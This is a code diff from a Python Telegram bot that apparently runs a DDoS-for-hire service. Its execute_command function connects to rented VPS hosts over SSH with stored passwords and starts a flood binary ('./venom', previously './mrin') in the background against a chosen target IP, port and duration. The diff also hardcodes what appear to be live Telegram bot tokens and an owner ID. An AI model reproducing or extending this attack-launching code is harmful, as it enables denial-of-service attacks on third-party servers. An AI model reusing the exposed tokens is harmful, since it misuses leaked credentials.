@@ -11,7 +11,7 @@ from datetime import datetime, timedelta
 from concurrent.futures import ThreadPoolExecutor
 
 # Replace these with your actual credentials
-BOT_TOKEN = '7909374116:AAESmzi6HalD3N_3ZaelAsNKliMJVbU3th0'
+BOT_TOKEN = '7715609619:AAHzD-H2qh6RLfkWiJLQxY6iKLC6_JnplyM'
 BOT_OWNER_ID = 5730843286  # Replace with your Telegram ID
 
 bot = telebot.TeleBot(BOT_TOKEN)
@@ -168,7 +168,7 @@ def get_credit_history(admin_id):
 # ---------------------------
 def execute_command(vps, target_ip, target_port, duration):
     try:
-        command = f'nohup ./mrin {target_ip} {target_port} {duration} 900 > /dev/null 2>&1 &'
+        command = f'nohup ./venom {target_ip} {target_port} {duration} 400 > /dev/null 2>&1 &'
         client = paramiko.SSHClient()
         client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         client.connect(vps['ip'], username=vps['username'], password=vps['password'], timeout=10)
